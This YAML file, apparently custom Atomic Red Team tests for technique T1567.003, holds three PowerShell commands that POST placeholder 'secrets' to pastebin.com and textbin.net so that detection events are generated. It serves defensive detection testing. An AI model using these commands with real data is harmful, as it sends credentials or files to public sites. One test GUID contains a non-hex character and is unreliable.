attack_technique: T1567.003
display_name: 'Exfiltration Over Web Service: Exfiltration to Text Storage Sites - Custom'
atomic_tests:
  - name: PowerShell Invoke-RestMethod exfil to pastebin (custom)
    auto_generated_guid: a1b2c3d4-e5f6-7890-abcd-ef1234567890
    description: |
      Simulates credential exfiltration to pastebin.com via PowerShell
      Invoke-RestMethod POST. Produces EID 1 with powershell.exe Image
      and pastebin.com in CommandLine. API key is redacted — not executed.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        Invoke-RestMethod -Uri https://pastebin.com/api/api_post.php `
          -Method Post `
          -Body @{
            api_dev_key  = "REDACTED"
            api_option   = "paste"
            api_paste_code = "exfil_placeholder_data"
          }
  - name: PowerShell WebClient Exfil to Pastebin via EID3 (custom)
    auto_generated_guid: a3f2c891-7d4e-4b8a-9c1f-2e5d6a7b8c9d
    description: |
      Exfiltrates data to pastebin.com using System.Net.WebClient POST request.
      Generates EID 3 (network connection) to pastebin.com on port 443.
      Uses WebClient directly to produce a clean network connection event.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $data = "exfil_test_data_secrets_api_keys"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
        $body = "api_dev_key=test_key&api_option=paste&api_paste_code=" + $data
        try {
          $result = $wc.UploadString("https://pastebin.com/api/api_post.php", $body)
        } catch {}
 
  - name: PowerShell Invoke-WebRequest Exfil to textbin.net via EID3 (custom)
    auto_generated_guid: b4e3d902-8e5f-5c9b-0d2g-3f6e7b8c9d0e
    description: |
      Exfiltrates data to textbin.net using Invoke-WebRequest POST.
      Generates EID 3 (network connection) to textbin.net on port 443.
      Uses a different text storage site to vary the network destination.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $data = "exfil_test_payload_passwords_tokens"
        $uri = "https://textbin.net/post"
        try {
          Invoke-WebRequest -Uri $uri -Method POST -Body @{content=$data} -UseBasicParsing
        } catch {}